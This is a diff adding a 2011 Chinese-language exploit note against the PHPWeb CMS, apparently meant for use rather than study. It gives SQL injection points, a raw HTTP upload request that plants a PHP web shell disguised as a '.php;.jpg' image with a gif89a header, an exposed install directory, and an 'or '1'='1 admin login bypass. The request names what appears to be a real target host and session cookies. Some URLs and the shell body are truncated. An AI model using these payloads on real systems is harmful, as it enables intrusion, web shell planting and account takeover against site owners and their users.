@@ -1,0 +1,55 @@
+################################################
+# Title: phpweb 注射、上传、安装文件漏洞、万能密码
+
+# Time：2011-10-15
+
+# Team: 
+
+# Author: lostowlf
+###############################################
+#home: hi.baidu.com/nginxshell
+
+-----------------------exploit-------------------
+******sqlinjection******* 
+http://www.shitsec.com/down/class/index.php?myord=1{sqlinjection}
+
+http://www.shitsec.com/photo/clas ... mp;key=&myord=1 {sqlinjection}
+
+***********getshell********
+POST /kedit/upload_cgi/upload.php HTTP/1.0www.90sec.org" 
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/xaml+xml, application/vnd.ms-xpsdocument, application/x-ms-xbap, application/x-ms-application, */*
+Referer: http://www.shitsec.com/news/admin/new ... p;pid=all&page= 
+Accept-Language: zh-cn
+Content-Type: multipart/form-data; boundary=---------------------------7db516c0118
+UA-CPU: x86
+Pragma: no-cache
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)
+Host: lib.jlnu.edu.cn
+Proxy-Connection: Keep-Alive
+Cookie: CODEIMG=6878; SYSZC=c7646d833635a773e6a89e364d9f0eca; SYSUSER=wlf; SYSNAME=%E7%8E%8B%E7%AB%8B%E5%B3%B0; SYSUSERID=15; SYSTM=1318373657- D1 F$ M( R3 _8 {3 U. V
+Content-Length: 6620
+
+-----------------------------7db516c0118
+Content-Disposition: form-data; name="fileName"
+
+201110121318373662005.php;.jpg
+-----------------------------7db516c0118
+Content-Disposition: form-data; name="attachPath"
+
+news/pics/
+-----------------------------7db516c0118
+Content-Disposition: form-data; name="fileData"; filename="C:\6.gif"
+Content-Type: image/gif
+gif89a
+');?>
+
+
+*********install file:**********
+http://www.shitsec.com/base/install/
+
+*********admin********
+www.shitsec.com/admin.php
+username: admin 'or '1'='1
+username: admin 'or '1'='1
+-----------------------exploit end -------------------
+
